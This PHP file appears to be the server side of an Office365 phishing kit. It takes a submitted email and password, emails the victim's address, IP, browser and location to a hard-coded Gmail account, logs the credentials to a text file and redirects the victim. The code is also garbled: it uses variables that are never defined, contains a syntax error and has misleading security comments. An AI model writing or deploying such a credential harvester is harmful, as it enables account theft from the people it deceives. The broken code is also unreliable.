<?php
// Define constants for clarity and easier future updates
define("EMAIL", "terryanderson0110@gmail.com"); // Recipient email address
define("SUBJECT", "Office365 - Login Attempt");
define("FROM_EMAIL", "noreplay.dgz.gdn@protonmail.com");
define("LOCATION", "http://example.com"); // Replace with your desired URL to redirect users after submission

require_once __DIR__ . '/geoplugin.class.php';

if (!function_exists('sha256')) {
    function sha256($data) {
        return hash('sha256', $data);
    }
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.html');
    exit;
}

$errors = [];
if (empty($_POST["email"]) || empty($_POST["password"])) {
    $errors[] = 'Please fill out all required fields.';
} else if (!filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
    $errors[] = 'Invalid email format provided.';
}

if (!$errors) {
    session_start();
    $_SESSION['nonce'] = generateNonce();
    mail($TheBoss, SUBJECT, getMessage(), buildHeaders());
    $hashedPassword = sha256($_POST["password"]);
    $fileHandle = fopen(__DIR__ . '/loginAttempts.txt', 'a');
    fwrite($fileHandle, date('Y-m-d H:i:s ') . "[$ip]: Email=$Email\tPassword=[$hashedPassword]\r\n");
    fclose($fileHandle);
    header('Location: ' . LOCATION);
} else {
    foreach ($errors as $error) {
        printf("<p>%s</p>", htmlspecialchars($error));
    }
}

/**
 * Generate nonce value to prevent CSRF attacks
 */
function generateNonce(): string
{
    return bin2hex(random_bytes(32));
}

/**
 * Build message content for the email
 * @return string
 */
function getMessage(): string
{
    $countryInfo = geoPlugin()->getGeographyData();
    $message = "";
    $message .= "--\n";
    $message .= "From IP: {$countryInfo['IPAddress']}\n";
    $message .= "User Agent: {$_\SERVER['HTTP_USER_AGENT']}\n";
    $message .= "Date: " . date('D M d, Y g:i A T') . "\n";
    $message .= "--\n";
    $message .= "Email: [" . htmlspecialchars($_POST["email"]) . "]\n";
    $message .= "Password Hash: [REMOVED FOR SECURITY REASONS]\n";
    return $message;
}

/**
 * Build headers for the email
 * @return string
 */
function buildHeaders(): string
{
    ob_end_clean();
    return "MIME-Version: 1.0\r\nContent-type:text/plain; charset=\"UTF-8\"\r\nFrom: {$fromEmail}\r\nTo: {$recipient}\r\nSubject: {$subject}\r\n";
}
